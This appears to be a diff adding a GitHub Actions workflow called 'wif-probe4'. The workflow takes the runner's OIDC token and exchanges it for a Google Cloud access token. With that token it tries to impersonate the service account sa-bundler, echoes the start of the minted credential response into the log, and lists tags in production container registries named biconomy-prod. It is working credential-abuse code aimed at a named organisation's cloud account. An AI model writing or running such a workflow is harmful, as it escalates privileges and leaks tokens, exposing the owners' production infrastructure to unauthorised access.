@@ -1,0 +1,23 @@
+name: wif-probe4
+on:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  probe:
+    runs-on: ubuntu-latest
+    steps:
+      - run: |
+          OIDC=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=https%3A%2F%2Fiam.googleapis.com%2Fprojects%2F766873424314%2Flocations%2Fglobal%2FworkloadIdentityPools%2Fpool-id-github-actions%2Fproviders%2Fga-bundler")
+          TOKEN=$(echo "$OIDC" | jq -r .value)
+          STS=$(curl -s -X POST https://sts.googleapis.com/v1/token -H "Content-Type: application/json" -d "{\"grant_type\":\"urn:ietf:params:oauth:grant-type:token-exchange\",\"audience\":\"//iam.googleapis.com/projects/766873424314/locations/global/workloadIdentityPools/pool-id-github-actions/providers/ga-bundler\",\"scope\":\"https://www.googleapis.com/auth/cloud-platform\",\"requested_token_type\":\"urn:ietf:params:oauth:token-type:access_token\",\"subject_token\":\"$TOKEN\",\"subject_token_type\":\"urn:ietf:params:oauth:token-type:jwt\"}")
+          ACC=$(echo "$STS" | jq -r .access_token)
+          echo "acc_len=" ${#ACC}
+          echo "== IAM sa-bundler@prj-workload-identity-001 =="
+          curl -s -X POST "https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/sa-bundler@prj-workload-identity-001.iam.gserviceaccount.com:generateAccessToken" -H "Authorization: Bearer $ACC" -H "Content-Type: application/json" -d '{"scope":["https://www.googleapis.com/auth/cloud-platform"]}' | head -c 500
+          echo ""
+          echo "== GAR biconomy-prod bundler tags =="
+          curl -s "https://us-docker.pkg.dev/v2/biconomy-prod/bundler/trustwallet/tags/list" -H "Authorization: Bearer $ACC" | head -c 400
+          echo ""
+          curl -s "https://us-docker.pkg.dev/v2/prj-biconomy-prod-001/bundler/bundler/tags/list" -H "Authorization: Bearer $ACC" | head -c 400
